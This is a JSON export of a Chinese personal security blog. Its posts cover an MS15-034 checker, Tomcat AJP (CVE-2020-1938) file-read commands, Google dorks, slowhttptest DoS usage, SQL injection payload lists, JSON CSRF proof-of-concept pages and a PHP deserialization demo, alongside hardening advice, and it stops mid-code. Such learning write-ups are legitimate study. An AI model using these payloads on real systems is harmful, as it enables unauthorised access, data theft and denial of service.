{"pages":[{"title":"about-me","text":"和你们一样，为了自己正努力生活的人。","link":"/about-me/index.html"},{"title":"about","text":"不断学习的小菜鸡！此博客主要收集整理资料自学所用，如有侵权或未标明出处请联系，谢谢！欢迎指正:f4guo.hmp@gmail.com","link":"/about/index.html"},{"title":"tags","text":"","link":"/tags/index.html"},{"title":"categories","text":"","link":"/categories/index.html"}],"posts":[{"title":"APP安全测试入门(其一)","text":"青年人关心自己，对周围的人往往不大留意。最忘恩负义的——同时也是最不讨人喜欢的——年龄是17-20岁。对生活尚未习惯，对自己也是如此。不理解生，不理解死，不理解人们，而与此同时又确信他把一切都看透了，正所谓看破红尘，万念俱灰。 0x00 前言虽然每次看那些技术书籍，前两章都是讲环境搭建，准备工具之类的，觉得很枯燥。现在就是真香打脸 0x01 磨刀AndroidKiller个人觉得挺牛逼的apk反编译工具，还在学习中。 dex2jardex文件2到jar文件，也就是将apk中的java源码编译生成的java字节码文件反编译成java源码，其中2的英文谐音为two，也就是 dex 到 jar。首先将.apk改为.zip文件，然后解压打开解压得到的文件，复制classes.dex到dex2jar的根目录下(建议将classes.dex重命名，后缀不变)然后在dex2jar根目录下执行命令行：d2j-dex2jar.bat classes.dex最后用jd-gui直接打开classes-dex2jar.jar文件就ok了，接下就是漫长的源码分析阶段了。 jd-gui是一个用于Java编程语言源代码“.class”文件反编译软件，可以直接打开.jar文件。 0x02 霍霍向牛羊","link":"/2019/06/26/APP%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8-%E5%85%B6%E4%B8%80/"},{"title":"CDN下的真实IP","text":"每一个前十年都想不到后十年我会演变成何等模样，可知人生无常，没有什么规律，没有什么必然。或富或贫或贵或贱，或左或右或高或低，无非环境造就，皆是时势促成。所以我要劝人：你可以自得，但不应自傲；你可以自守，但不应自卑；你可以自爱，但不应自恋；你可以自伤，但不应自弃。 ——流沙河《画火御寒》之前测试老是有那种在CDN之后的服务器，然后不能确定其服务器真实IP，上网查了一些方法总结了一下。假设 www.test.com 使用了CDN 0x00 ping test.com有可能 www.test.com 和 test.com 的解析是两条独立的记录。 0x01 ping a.test.com很多公司很有可能没有给二级域名做CDN服务。 0x02 找历史DNS记录有些公司在使用CDN前后其IP地址会发生变化，只要找到使用使用CDN之前的IP地址就行。可以用 netcraft.com 查询。 0x03 使用国外vpn服务器ping大多数CDN只针对国内的DNS服务器而没有考虑到国外的。nslookup www.test.com 205.111.60.21 0x04 反向查询让服务器给你推送消息，EX记录查询，邮件头IP。 0x05 寻找探针文件phpinfo，server info。","link":"/2019/01/31/CDN%E4%B8%8B%E7%9A%84%E7%9C%9F%E5%AE%9EIP/"},{"title":"HTTP.sys远程代码执行漏洞","text":"如果有一天，当工作环境、生活环境和生活条件不再适合你的性格了，那时，且只有那时，你才能寻求改变。——马洛伊·山多尔《草叶集》 0x00 漏洞概述远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。 成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。若要利用此漏洞，攻击者必须将经特殊设计的 HTTP 请求发送到受影响的系统。 通过修改 Windows HTTP 堆栈处理请求的方式，此更新可以修复此漏洞。Microsoft 通过协同的漏洞披露渠道了解到此漏洞的信息。 在最初发布此安全公告时，Microsoft 未收到任何表明此漏洞已公开用于攻击用户的信息。来源：https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2015/ms15-034 0x01 漏洞检测简单检测该漏洞，响应码416说明存在此漏洞。 1curl -v xxx.com -H \"Host: irrelevant\" -H \"Range: bytes=0-18446744073709551615\" POC 1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/python3#-*-coding: utf-8 -*-import requests#检测服务器bannerdef check_server(url): try: r = requests.get(url) head_dict = r.headers serinfo = head_dict.get(\"Server\") if \"Microsoft-IIS\" in serinfo: ms15_034(url) else: print(\"The server may not Microsoft IIS!\") ms15_034(url) except requests.exceptions.RequestException as msg: print(\"Error:{}\".format(msg))def ms15_034(url): head = {\"Range\": \"bytes=0-18446744073709551615\"} try: r = requests.get(url, headers = head) #或者 \"Requested Range Not Satisfiable\"在响应包头中 if r.status_code == 416: print(\"Target is vlun!\") else: print(\"Target is not vlun!\") except requests.exceptions.RequestException as msg: print(\"Error:{}\".format(msg))if __name__ == '__main__': url = str(input(\"Input the target_url:\")) print(\"Start check....\") check_server(url) 0x02 漏洞修复更新微软官方补丁","link":"/2019/07/17/HTTP-sys%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"title":"CVE-2020-1938-Tomcat-AJP漏洞复现","text":"0x00 漏洞概述漏洞危害2020年1月6日，国家信息安全漏洞共享平台（CNVD）收录了由北京长亭科技有限公司发现并报送的Apache Tomcat文件包含漏洞（CNVD-2020-10487，对应CVE-2020-1938）。风险程度为高危，攻击者利用该漏洞，可在未授权的情况下远程读取特定目录下的任意文件。由于Tomcat AJP协议存在实现缺陷导致相关参数可控，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。若服务器端同时存在文件上传功能，攻击者可进一步实现远程代码的执行。 影响版本Apache Tomcat = 67 &lt;= Apache Tomcat &lt; 7.0.1008 &lt;= Apache Tomcat &lt; 8.5.519 &lt;= Apache Tomcat &lt; 9.0.31 漏洞原理0x01 漏洞复现漏洞分析先找个Tomcat实验一把,我这里选的9.0.30。安装过程就不赘述了，安装完成后如下图：python版本的POC 1python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.160.131 -p 8009 -f WEB-INF/web.xml java版本的POC，我物理环境机器java环境有问题，就直接用虚拟机中的java环境执行了，命令行中的地址和jar名称自行修改。任意文件读取:java -jar cve-2020-1938.jar com.threedr3am.bug.tomcat.ajp.FileRead 127.0.0.1 8009 file /index.jsp文件包含:java -jar cve-2020-1938.jar com.threedr3am.bug.tomcat.ajp.FileRead 127.0.0.1 8009 jsp /index.jsp POChttps://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfihttps://github.com/0nise/CVE-2020-1938 漏洞修复1.升级Tomcat至9.0.31\\8.5.51\\7.0.100最新版本，Apache官方在以上版本已经修复该漏洞。2.如无法立即进行升级，建议直接关闭AJPConnector、或将其监听地址改为监听本地localhost。 参考文献https://mp.weixin.qq.com/s/6-SNuCgo2riz7ty8FiAbvw","link":"/2020/02/25/CVE-2020-1938-Tomcat-AJP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"title":"Google Hacking语法","text":"未来并不起源于已知。 ——艾柯·卡里埃尔《别想摆脱书》 0x00 前言挖不到洞其实信息收集不够，虽然我也没提交过漏洞……因为我菜 0x00 基本搜索语法site：test.com 搜索站点及其host或url,获取子域名 inurl: url中是否存在关键字。 intext：网页正文中是否存在关键字。 filetype：获取目标的文件类型。如filetype：doc|ppt| bak|mdb|inc，会返回所有以doc,ppt,bak,mdb,inc结尾的文件url。 link：返回所有与目标url做了链接的url。 cache：搜索google里关于某些内容的缓存。操作符： . 单一的通配符 * 通配符，可代表多个字符 &quot;&quot; 精确查询0x01 组合搜索获取test.com的管理后台(如果存在) intitle:管理后台 site:www.test.com搜索指定test.com的doc文档（Excel/PDF/PPT） site:test.com filetype:doc根据实际情况组合就行 0x02 综合利用查找后台site:xx.com intext:管理 site:xx.com inurl:login site:xx.com intitle:后台查看服务器使用的程序site:xx.com filetype:asp site:xx.com filetype:php site:xx.com filetype:jsp site:xx.xom filetype:aspx查看上传漏洞site:xx.com inurl:file site:xx.xom inurl:load","link":"/2019/03/03/Google%20Hacking%E8%AF%AD%E6%B3%95/"},{"title":"HTTP慢速拒绝服务攻击","text":"即使生活百般刁难，也别成为自己曾经讨厌的那种人。——《日常》 0x00 HTTP慢速拒绝服务攻击是以极低的速度往服务器发送HTTP请求。由于Web Server对于并发的连接数都有一定的上限，因此若是恶意地占用住这些连接不释放，那么Web Server的所有连接都将被恶意连接占用，从而无法接受新的请求，导致拒绝服务。 0x01慢速攻击分类Slow headers：Web应用在处理HTTP请求之前都要先接收完所有的HTTP头部，因为HTTP头部中包含了一些Web应用可能用到的重要的信息。攻击者利用这点，发起一个HTTP请求，一直不停的发送HTTP头部，消耗服务器的连接和内存资源。抓取数据包分析可知，攻击客户端与服务器建立TCP连接后，每30秒才向服务器发送一个HTTP头部，而Web服务器在没接收到2个连续的\\r\\n时，会认为客户端没有发送完头部，而持续的等客户端发送数据。 Slow body：攻击者发送一个HTTP POST请求，该请求的Content-Length头部值很大，使得Web服务器或代理认为客户端要发送很大的数据。服务器会保持连接准备接收数据，但攻击客户端每次只发送很少量的数据，使该连接一直保持存活，消耗服务器的连接和内存资源。抓取数据包分析可知，攻击客户端与服务器建立TCP连接后，发送了完整的HTTP头部，POST方法带有较大的Content-Length，然后每10s发送一次随机的参数。服务器因为没有接收到相应Content-Length的body，而持续的等待客户端发送数据。 Slow read：客户端与服务器建立连接并发送了一个HTTP请求，客户端发送完整的请求给服务器端，然后一直保持这个连接，以很低的速度读取Response，比如很长一段时间客户端不读取任何数据，通过发送Zero Window到服务器，让服务器误以为客户端很忙，直到连接快超时前才读取一个字节，以消耗服务器的连接和内存资源。抓包可见，客户端把数据发给服务器后，服务器发送响应时，收到了客户端的ZeroWindow提示（表示自己没有缓冲区用于接收数据），服务器不得不持续的向客户端发出ZeroWindowProbe包，询问客户端是否可以接收数据。 0x02 慢速攻击工具slowhttptestKali一键安装：apt-get install slowhttptest 参数1234567891011121314151617181920212223242526272829303132333435363738测试模式:-H slow header,slowloris默认采用此模式 -B slow body-R 远程攻击又名Apache killer-X slow read报告选项：-g 生成具有套接字状态更改的统计信息（默认关闭）-o file_prefix 将统计信息输出保存在file.html和file.csv中（需要-g）-v level 日志信息，详细级别0-4：致命，信息，错误，警告，调试常规选项：-c connections 连接目标连接数（50）-i seconds 后续数据之间的间隔（以秒为单位）（10）-l seconds 测试目标时间长度，以秒为单位（240）-r rate 每秒连接数（50）-s 如果需要，Content-Length标头的值（4096）-t 在请求中使用的动词，对于slow header和response，默认为GET；对于slow body，默认为POST-u URL 目标的绝对URL（http://localhost/）-x 在slowloris and Slow POST tests模式中，指定发送的最大数据长度-f Content-Type标头的值（application/x-www-form-urlencoded）-m 接受(Accept)标头的值（text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5）探测/代理选项：-d host:port 为所有连接指定代理-e host:port 为探测连接指定代理-p seconds 指定等待时间来确认DoS攻击已经成功range attack特定选项：-a 标头中的起始位置-b 标头中的结束位置slow read特定选项：-k 在连接中重复相同请求的次数。如果服务器支持永久连接，则用于成倍增加响应大小。-n 从recv缓冲区读取操作之间的时间间隔，以秒为单位（1）-w slow read模式中指定tcp窗口范围下限-y slow read模式中指定tcp窗口范围上限-z 在每次的read中，从buffer中读取数据量 对于存在该漏洞的某主机，执行命令行：slowhttptest -c 5000 -u http://xxxx ![](/images/paperimage/slowhttptest01.png) 0x03 修复建议针对不同的Server其对慢速http拒绝服务攻击防范方法也不同，建议使用以下措施防范慢速http拒绝服务攻击：【WebSphere】1、限制 HTTP 数据的大小在WebSphere Application Server 中进行如下设置： 何单个 HTTP 头的默认最大大小为 32768 字节。可以将它设置为不同的值。 HTTP 头的默认最大数量为 50。可以将它设置为不同的限制值。另一种常见的 DOS 攻击是发送一个请求，这个请求会导致一个长期运行的 GET 请求。WebSphere Application Server Plug-in 中的 ServerIOTimeoutRetry 属性可限制任何请求的重试数量。这可以降低这种长期运行的请求的影响。设置限制任何请求正文的最大大小。 2、设置keepalive参数 打开ibm http server安装目录，打开文件夹conf，打开文件httpd.conf,查找KeepAlive值，改ON为OFF,其默认为ON。这个值说明是否保持客户与HTTP SERVER的连接，如果设置为ON，则请求数到达MaxKeepAliveRequests设定值时请求将排队，导致响应变慢。 【Weblogic】1、在配置管理界面中的协议-&gt;一般信息下设置 完成消息超时时间小于4002、在配置管理界面中的协议-&gt;HTTP下设置 POST 超时、持续时间、最大 POST 大小为安全值范围。 【Nginx】1、通过调整$request_method，配置服务器接受http包的操作限制；2、在保证业务不受影响的前提下，调整client_max_body_size, client_body_buffer_size, client_header_buffer_size,large_client_header_buffersclient_body_timeout, client_header_timeout的值，必要时可以适当的增加；3、对于会话或者相同的ip地址，可以使用HttpLimitReqModule and HttpLimitZoneModule参数去限制请求量或者并发连接数；4、根据CPU和负载的大小，来配置worker_processes 和 worker_connections的值，公式是：max_clients = worker_processes * worker_connections。 【Apache】建议使用mod_reqtimeout和mod_qos两个模块相互配合来防护。1、mod_reqtimeout用于控制每个连接上请求发送的速率。配置例如： 请求正文部分，设置超时时间初始为10秒，并在收到客户端发送的数据后，每接收到500字节数据就将超时时间延长1秒，但最长不超过40秒。可以防护slow message body型的慢速攻击。RequestReadTimeout body=10-40,minrate=500 需注意，对于HTTPS站点，需要把初始超时时间上调，比如调整到20秒。2、mod_qos用于控制并发连接数。配置例如： 当服务器并发连接数超过600时，关闭keepaliveQS_SrvMaxConnClose 600每个源IP最大并发连接数为50QS_SrvMaxConnPerIP 50 这两个数值可以根据服务器的性能调整。 【IHS服务器】先安装最新补丁包，然后启用mod_reqtimeout模块，在配置文件中加入： loadModule reqtimeout_module modules/mod_reqtimeout.so为mod_reqtimeout模块添加配置： &lt;IfModule mod_reqtimeout.c&gt; RequestReadTimeout header=10-40,MinRate=500 body=10-40,MinRate=500 &lt;/IfModule&gt;对于HTTPS站点，建议 header=20-40,MinRate=500。 0x04 参考链接https://blog.csdn.net/alex_bean/article/details/87626834https://blog.csdn.net/madao1o_o/article/details/88421423","link":"/2019/10/09/HTTP%E6%85%A2%E9%80%9F%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/"},{"title":"Linux服务器安全运维及加固","text":"余生很长，请别太过善良。——《日常》 0x00 前言前不久参加了一个网络攻防比赛，需要对自己服务器进行安全加固防止别人获取shell，然后结合工作中有时候会遇到服务器是linux系统且无法进行渗透测试的情况，在此了解一下linux服务器是如何进行安全加固和运维的。 0x01 系统主要是从以下四个方面入手 账号安全保存账户的文件，密码强度以及密码设置策略。限制用户登录次数 认证授权文件夹以及文件的权限，用户组以及用户的权限 协议安全SSH、Telnet、禁止匿名FTP登录、禁止ping。 SSH是一个协议，利用它可以登录到一个远程系统或远程执行系统命令，默认允许root登录，并且sshv1存在缺陷，我们应该在sshd_config禁止root访问和使用sshv2来让ssh更加安全。vim /etc/ssh/sshd_config 修改为 1PermitRootLogin no 审计安全日志、安全事件记录 日志服务器的好处在于，每个工作服务器将自己的日志信息发送给日志服务器进行集中管理，即使有人入侵了服务器并将自己的登录信息悄悄删除，但由于日志信息实时与日志服务器同步，保证了日志的完整性。以备工作人员根据日志服务器信息对服务器安全进行评测。建立日志服务器需要修改客户端的配置文件/etc/rsyslog.conf需要保留对应类型的日志文件，修改原来对应保存目录为：@日志服务器ip，然后重启rsyslog服务 1systemctl restart rsyslog 在服务端将配置文件中的后两行注释掉，然后重启rsyslog服务，开启防火墙： 12systemctl restart rsyslogirewall-cmd --add-port=514/tcp 0x02 web服务Tomcat一、保持升级到最新稳定的版本二、修改默认配置：端口、后台管理目录 修改server.xml Tomcat默认启动三个端口，8080、8005、8009，8080是默认访问端口，8005是shutdown端口，8009是AJP端口三、关闭非必须的服务，删除不必要的文件 1. 删除webapps目录下，除开发应用外的其它目录，包括：docs、examples、host-manager、manager和ROOT，执行命令： rm -rf docs examples host-manager manager ROOT 2. 删除conf目录下tomcat-users.xml文件,执行命令： rm -rf tomcat-users.xml 3. 清空Tomcat缓存work目录，执行命令： rm -rf Catalina 4. 重启Tomcat默认 Tomcat 是开启了对war包的热部署的，为了防止被植入木马等恶意程序，因此我们要关闭自动部署。修改Tomcat下的conf文件夹下的server.xml文件,true修改为false。","link":"/2019/09/20/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%E5%8F%8A%E5%8A%A0%E5%9B%BA/"},{"title":"SQL注入技巧其二","text":"生活不能等待别人来安排，要自己去争取和奋斗；而不论其结果是喜是悲，但可以慰藉的是，你总不枉在这世界上活了一场，有了这样的认识，你就会珍重生活，而不会玩世不恭；同时也会给人自身注入一种强大的内在力量…… ——路遥《平凡的世界》 0x01 确定注入点一般存在sql注入的地方是url中的参数。如 xxx.php?id=234、xxx.php?username=sss&amp;password=xxx … 也可以简单粗暴的sqlmap直接跑，可能会对服务器造成影响，其他类似的工具也有很多，慎用！！！sqlmap的具体用法请自行百度。 用or或者and逻辑符判断存在sql注入之后，接着判断是什么类型的注入(其实在手工判断是否存在注入的过程中能知道是什么类型的注入了)： 字符型 数字型 返回错误 盲注 这里以我自己搭建的bWapp中的sql为例吧 0x02 低阶注入获取查询返回的列数order by 对结果集按照升序或降序排列 1&apos; order by 1 --+ 1&apos; order by 2 --+ 1&apos; order by 3 --+ ......获取数据库名称或版本 &apos; union select 1,2,3 --+ &apos; union select 1,versoin(),null --+ &apos; union select 1,database(),version() --+ ......进一步获取数据库中的信息，information_schema是mysqlde 一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。 &apos; union select 1,table_name,3 from information_schema.tables where table_schema=database() --+Limit By 从一个或多个表中检索记录limit 3，1的作用是从查询的结果中从第3行开始，只显示一行 &apos; union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 3,1 --+也可以利用group_concat()函数查出所有的表格名称 &apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+分析查找目标表格，列出表格中的列 &apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos; --+ &apos; union select 1,group_concat(username),3 from users --+ &apos; union select 1,group_concat(password),3 from users --+ &apos; union select 1,group_concat(username),group_concat(password) from users --+以上测试语句是基于字符型的注入 0x03 高阶注入基于布尔型盲注left(database(),1)&gt;&apos;s&apos; : database()显示数据库名称，left(a,b)从a的左侧截取前b位 substr(a,b,c) : 从 b 位置开始， 截取字符串 a 的 c 长度 mid(a,b,c) : 从位置 b 开始， 截取 a 字符串的 c 位 ascii(): 将某个字符转换为ascii值 ord(): 同 ascii()， 将字符转为 ascii 值 like 匹配注入: select user() like ‘ro%’ 正则匹配注入: select user() regexp &apos;^ro&apos;; 正则表达式的用法， user()结果为 root， regexp 为匹配 root 的正则表达式获取数据库名称长度 &apos; and (length(database())) = 1 --+ &apos; and (length(database())) = 2 --+ &apos; and (length(database())) = 3 --+ ...根据字符对应的ASCII码值使用关键字ascii substr枚举数据库名称中的每个字符(二分法) &apos; and (ascii(substr((select database()),1,1))) &gt; 100 --+ &apos; and (ascii(substr((select database()),1,1))) &lt; 150 --+ ... 基于时间的盲注延时注入 sleep() benchmark是Mysql的一个内置函数,其作用是来测试一些函数的执行速度。 benchmark()中带有两个参数，第一个是执行的次数，第二个是要执行的函数或者是表达式 heavy query 通过大量查询导致查询时间较长来达到延时的目的 CAST()函数用于将某种数据类型的表达式显式转换为另一种数据类型。CAST()函数的参数是一个表达式，它包括用AS关键字分隔的源值和目标数据类型。 语法：CAST (expression AS data_type) expression：任何有效的SQServer表达式。 AS：用于分隔两个参数，在AS之前的是要处理的数据，在AS之后是要转换的数据类型。 data_type：目标系统所提供的数据类型，包括bigint和sql_variant，不能使用用户定义的数据类型。mid(database(),m,n):返回数据库名的第m位之后的n位 如果数据库名称中的第二位为b,就会延时5秒返回结果 &apos; and if((mid(database(),2,1)=98),sleep(5),0) 如果数据库名称中的第二位为c,就会延时100秒返回结果 &apos; and if((mid(database(),2,1)=99),sleep(100),0) ...基于报错的盲注round(): 遵循四舍五入把原值转化为指定小数位数。如：round(1.45,0) = 1;round(1.55,0)=2 ceiling(): 向上舍入为指定小数位数.如：ceiling(1.45,0) = 2;ceiling(1.55,0)=2 floor(): 向下舍入为指定小数位数.如：floor(1.45,0)= 1;floor(1.55,0) = 1 rand(): 返回一个介于0和1之间的随机数，float类型，开区间 group by分组后数据计数时重复造成的错误 double 数值类型超出范围 select exp(~(select * FROM(SELECT USER())a)) //Exp()为以 e 为底的对数函数； 版本在 5.5.5 及其以上 bigint 超出范围 select !(select * from (select user())x) -（ps:这是减号） ~0 //~0 是对 0 逐位取反， 很大的版本在 5.5.5 及其以上 xpath 错误 mysql 重复特性二阶注入一次注入的恶意数据被存入了数据库，然后再次利用第一次存入数据库中的恶意数据进行第二次注入攻击。 参考：SQL注入新手教程","link":"/2019/02/22/SQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7%E5%85%B6%E4%BA%8C/"},{"title":"SQL注入技巧其一","text":"人们很少能够在处理现在和将来两者当中把握一个恰到好处的尺度。那些以希望和努力生活在将来的人眼睛盯着前面，不耐烦的等待将要发生的事情，仿佛将来的事情才会为他们带来真正的幸福。在这期间，他们却对现在不予理会，不加咀嚼，听任现时匆匆逝去。 ——叔本华《人生的智慧》 0x00 前言随着网络安全技术的发展，大多数网站对于SQL注入漏洞的防护已经很全面了，现如今发现sql注入漏洞不像以前那么容易了。对于sql的手工注入技巧我也老是忘，这里复习一下，做个记录，也方便以后查阅。个人觉得不适合新手向。 0x01 注入分类基于从服务器接受到的响应，我们可以将SQLi分为以下几类： 1.基于错误的SQL注入. 2.联合查询的SQL注入. 3.堆查询注入. 4.SQL盲注: 基于报错的盲注. 基于布尔型的盲注. 基于时间的盲注.0x02 注入基础知识1.系统函数 version()——MySQL 版本 user()——数据库用户名 database()——数据库名 @@datadir——数据库路径 @@version_compile_os——操作系统版本2.连接函数 concat(str1,str2,...)——没有分隔符地连接字符串 concat_ws(separator,str1,str2,...)——含有分隔符地连接字符串 group_concat(str1,str2,...)——连接一个组的所有字符串， 并以逗号分隔每一条数据3.url编码 空格 %20 # %23 &apos; %27 &quot; %220x03 基本注入&apos; or &apos;&apos;=&apos; )&apos; or &apos;()&apos;=&apos;( &apos;) or 1=1 # &apos;) and 1=1 --+ &quot; or &quot;&quot;=&quot; )&quot; or &quot;()&quot;=&quot;() &quot;) or 1=1 # &quot;) and 1=1 --+模糊查询： %&apos; or &apos;%1%&apos;=&apos;%1 %&quot; or &quot;%1%&quot;=&quot;%1万能密码： &apos; or &apos;1&apos;=&apos;1&apos; # &apos; or &apos;1&apos;=&apos;1&apos; --+根据实际情况进行灵活调整。 0x04 总结sql注入的原理就是开发者对于用户能控制的输入没有进行相关的安全处理（转义、编码），导致恶意用户能够重构数据库的查询语句从而获取非授权的数据。磨刀不误砍柴工，具体的注入技巧见其二。 参考文献：MySQL注入天书","link":"/2019/02/15/SQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7%E5%85%B6%E4%B8%80/"},{"title":"Nmap命令行参考","text":"人的一生中总会有这么一次特殊的旅行，，我更愿意把它叫作“命运之旅”。长久以来，我一直坚持认为，旅行与读书不同，如果是一本书，你可以反复阅读，而随着年龄的增长，也可以多次体会那种邂逅的感觉，但影响人生的旅行，一生只有一次。 ——角田光代《星期三的神明》 Nmap命令行目前还有点记不住，又懒得打字，偷个懒~~以后看图说话。 【侵删】","link":"/2019/03/20/Nmap%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8F%82%E8%80%83/"},{"title":"JSON格式的CSRF","text":"幸福感就如沉积在悲哀之河底隐隐发光的金沙。 ——太宰治《斜阳》 0x01 前言前几天给一个系统做测试的时候，发现存在一个self-xss漏洞,就想着有没有CSRF能够进一步利用一下，结果发现POST提交的是json数组，利用BurpSuite快捷生成CSRF Poc发现里面没有提交的数据。 尝试好几次都是同样的结果，这我就奇怪了，难道json CSRF还不太一样？查了一下还真有点区别。 0x02 未验证Content-type百度、必应、Google一顿骚操作，讲的最多就是Flash+307 redirect了。另外的有一种方法就是将 form 的 ENCTYPE 属性设置为 text/plain 时，json数组仍能被服务器接收，尝试发现返回结果说json格式错误(下列Poc做了一定处理，不是实际测试Poc)。 12345678910&lt;html&gt; &lt;title&gt;JSON CSRF POC&lt;/title&gt; &lt;form action=\"http://test.com/\" method=\"POST\" enctype=\"text/plain\" &gt; &lt;input name='{\"accesstoken\":\"111111111111\",\"strategynamex\":\"test\",\"strategytype\":\"002001\",\"conditionstype\":\"1\",\"stratemode\",\"1\",\"strategystatus\":\"1\",\"target\":\"' value='test\"}' type='hidden'&gt; &lt;/form&gt; &lt;script&gt; document.forms[0].submit(); &lt;/script&gt;&lt;/html&gt; 原来使用POST提交json数组到服务器，服务器检测有Content-Type: application/json请求头则通过，否则抛出一个异常。 0x03 验证Content-type使用XMLHttpRequest构造json： 12345678910111213141516171819&lt;html&gt; &lt;body&gt; &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt; &lt;script&gt; function submitRequest() { var xhr = new XMLHttpRequest(); xhr.open(\"POST\", \"https://www.admintony.com/address/addAddress.json\", true); xhr.setRequestHeader(\"Accept\", \"application/json, text/plain, */*\"); xhr.setRequestHeader(\"Content-Type\", \"application/json; charset=UTF-8\"); xhr.setRequestHeader(\"Accept-Language\", \"zh-CN,zh;q=0.9\"); xhr.withCredentials = true; var body = \"{\\\"name\\\":\\\"SRC\\\",\\\"tel\\\":\\\"18681992828\\\",\\\"country\\\":\\\"\\\",\\\"province\\\":\\\"北京市\\\",\\\"city\\\":\\\"北京市\\\",\\\"county\\\":\\\"东城区\\\",\\\"areaCode\\\":\\\"110101\\\",\\\"postalCode\\\":\\\"\\\",\\\"addressDetail\\\":\\\"中关村\\\",\\\"isDefault\\\":false,\\\"userName\\\":\\\"美团SRC\\\",\\\"lat\\\":10.077726938827084,\\\"lon\\\":100.33235369626206}\"; &lt;/script&gt; &lt;form action=\"#\"&gt; &lt;input type=\"button\" value=\"Submit request\" onclick=\"submitRequest();\" /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 使用fetch构造json请求： 123456789&lt;html&gt; &lt;title&gt;JSON CSRF POC&lt;/title&gt; &lt;script&gt; fetch('http://victim.com/vul.page', {method: 'POST', credentials: 'include', headers: {'Content-Type': 'text/plain'}, body: '{\"name\":\"attacker\",\"email\":\"attacker.com\"}'}); &lt;/script&gt; &lt;form action=\"#\"&gt; &lt;input type=\"button\" value=\"Submit request\"/&gt; &lt;/form&gt;&lt;/html&gt; 使用XMLHttpRequest、fetch能构造出JSON请求，并且能设置Content-Type，但是还是不能跨域，还是需要Flash+307 redirect才能利用。 0x04 总结json csrf分两种情况： 不验证content-type比较容易绕过，重新构造form数据就ok了。 验证content-type就要结合第三方工具使用了。 0x05 参考https://www.secpulse.com/archives/61297.htmlhttp://www.admintony.com/csrf-and-json.htmlhttps://www.cnblogs.com/blacksunny/p/7940287.htmlhttps://www.freebuf.com/articles/web/164234.html","link":"/2019/03/29/JSON%E6%A0%BC%E5%BC%8F%E7%9A%84CSRF/"},{"title":"PHP反序列化漏洞","text":"一切伟大的行动和思想，都有一个微不足道的开始。 ——阿尔贝·加缪《西西佛神话》 0x00 前言听说面试经常问PHP反序列化漏洞，想起来我自己也不懂。因为之前都是在搞一些老旧的东西，不能不进步，也差不多要学习高阶的知识了。 0x01 什么是反序列化明白序列化，就只知道什么是反序列化了，我觉得可以这样理解： 将数据或对象转换成另外一种利于存储或运输的格式，且这个转换过程是可逆的，这个过程就可以称为序列化，而逆向转换就是反序列化。 除了PHP存在反序列化漏洞外，Java也存在反序列化漏洞，Java反序列化漏洞的分析后面慢慢更新吧。PHP手册中关于对象序列化的描述： 所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示，unserialize()函数能够重新把字符串变回php原来的值。 反序列化一个对象将会保存对象的所有变量。但是不会保存对象的方法，只会保存类的名字。为了能够unserialize()一个对象，这个对象的类必须已经定义过。 如果序列化类A的一个对象，将会返回一个跟类A相关，而且包含了对象所有变量值的字符串。如果要想在另外一个文件中解序列化一个对象，这个对象的类必须在解序列化之前定义，可以通过包含一个该类的文件或使用函数spl_autoload_register()来实现。在PHP应用中，序列化和反序列化一般用做缓存，比如session缓存，cookie等。常见的序列化格式： 二进制格式 字节数组 json字符串 xml字符串 0x02 反序列化漏洞原理及其复现PHP中序列化和反序列化对应的函数就是serialize()和unserialize()。如果反序列化函数中的参数能被用户控制，就会产生反序列化漏洞。 PHP中存在一些以符号__开头的magic函数(方法)，magic函数是在某些条件下自动执行的函数。魔术方法是在实现一些功能，但是一般代码不能实现或者很难实现的时候才用。以下是PHP类中一些magic函数及其用法： __construct() 当一个对象创建时触发 * __destruct() 当一个对象被销毁时触发 * __toString() 把类当做字符串处理时触发 * __call() 在对象上下文调用不可访问的方法时触发 __callStatic() 在静态上下文中调用不可访问的方法时触发 __get() 用于从不可访问的属性读取数据时 __set() 用于将数据写入不可访问的属性 __wakeup() 使用unserialize触发 * __sleep() 使用serialize触发 *漏洞复现12345678910111213//demo.php&lt;?php class A{ public $target = \"demo\"; function __destruct(){ echo \"destructing!&lt;br/&gt;\"; echo $this-&gt;target.\"&lt;br/&gt;\"; echo \"destructed!&lt;br/&gt;\"; } }$a = $_GET['test'];$a_user = unserialize($a);?&gt; demo.php中的析构函数会回显$test的值，我们可以构造一个对象，控制$test的值，达到控制数据流的目的，实现反序列化漏洞的利用。注意：margic_quotes_gpc和magic_quotes_runtime配置项的设置会影响传递到unserialize()中的数据。 1234567&lt;?php class A{ public $targrt = \"dfsadfwefafas\"; }$a = serialize(new A);echo $a;?&gt; __wakeup()绕过(CVE-2016-7124):反序列化时，如果对象属性个数的值大于真实的属性个数时就会跳过__wakeup()的执行,此漏洞影响的主要版本为PHP5 5.6.25以前，PHP7 7.0.1以前。 1234567891011121314151617181920&lt;?phpclass A{ var $target = \"test\"; function __wakeup(){ $this-&gt;target = \"wakeup!\"; } function __destruct(){ 